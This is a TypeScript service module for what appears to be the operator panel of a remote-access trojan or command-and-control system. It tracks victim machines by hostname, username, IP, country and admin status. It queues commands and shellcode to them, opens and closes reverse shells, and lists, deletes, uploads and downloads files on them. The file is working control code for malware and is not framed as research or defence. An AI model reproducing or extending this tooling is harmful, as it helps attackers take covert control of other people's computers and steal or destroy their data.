import { apiFetch, fetchJson } from './api';

export interface ClientInfo {
  id: string;
  hostname: string;
  username: string;
  os: string;
  arch: string;
  ip: string;
  country_info: string;
  cpu_brand: string;
  cpu_frequency: number;
  cpu_cores: number;
  memory: number;
  total_disk_space: number;
  available_disk_space: number;
  connected_at: string;
  last_seen: string;
  is_admin: boolean;
}

export interface ClientDisplayResponse {
  clients: ClientInfo[];
  online_clients_count: number;
  admin_clients_count: number;
  os_types_count: number;
  total_clients: number;
}

export const clientService = {
  getClients: async (): Promise<ClientInfo[]> => {
    return fetchJson<ClientInfo[]>('/api/clients');
  },

  getClientsDisplay: async (): Promise<ClientDisplayResponse> => {
    return fetchJson<ClientDisplayResponse>('/api/clients/display');
  },

  deleteClient: async (clientId: string): Promise<{ success: boolean; message: string }> => {
    return fetchJson<{ success: boolean; message: string }>(`/api/clients/${clientId}`, {
      method: 'DELETE',
    });
  },

  queueCommand: async (
    clientId: string,
    command: string,
    args: string[] = [],
    messageId: string | null = null,
    shellcode: string | null = null
  ): Promise<{ success: boolean; message: string }> => {
    const res = await apiFetch(`/api/clients/${clientId}/commands`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ client_id: clientId, command, args, message_id: messageId, shellcode }),
    });
    const text = await res.text();
    if (res.ok) {
      if (text) {
        try {
          return JSON.parse(text);
        } catch {
          return { success: true, message: 'Command queued.' };
        }
      }
      return { success: true, message: 'Command queued.' };
    }
    throw new Error(text || `${res.status} ${res.statusText}`);
  },

  getCommandResults: async (clientId: string): Promise<any[]> => {
    return fetchJson<any[]>(`/api/clients/${clientId}/results`);
  },

  startReverseShell: async (clientId: string): Promise<{
    success: boolean;
    message: string;
    server_ip: string;
    port: number;
  }> => {
    return fetchJson(`/api/clients/${clientId}/reverse_shell`, {
      method: 'POST',
    });
  },

  getReverseShells: async (): Promise<{ connections: string[]; count: number }> => {
    return fetchJson<{ connections: string[]; count: number }>('/api/reverse_shells');
  },

  closeReverseShell: async (connectionId: string): Promise<any> => {
    return fetchJson(`/api/reverse_shells/${connectionId}/close`, {
      method: 'POST',
    });
  },

  listFiles: async (clientId: string, path: string, recursive: boolean = false): Promise<any> => {
    return fetchJson('/api/files/list', {
      method: 'POST',
      body: JSON.stringify({ client_id: clientId, path, recursive }),
    });
  },

  deleteFile: async (clientId: string, path: string): Promise<any> => {
    return fetchJson('/api/files/delete', {
      method: 'POST',
      body: JSON.stringify({ client_id: clientId, path }),
    });
  },

  uploadFile: async (clientId: string, path: string, fileData: Blob | ArrayBuffer): Promise<any> => {
    return fetchJson(`/api/files/upload/${path}?client_id=${clientId}`, {
      method: 'POST',
      body: fileData,
      headers: {
        'Content-Type': 'application/octet-stream',
      },
    });
  },

  getFileDownloadUrl: (clientId: string, path: string): string => {
    const cleanPath = path.startsWith('/') ? path.slice(1) : path;
    return `/api/files/download/${cleanPath}?client_id=${clientId}`;
  },
};
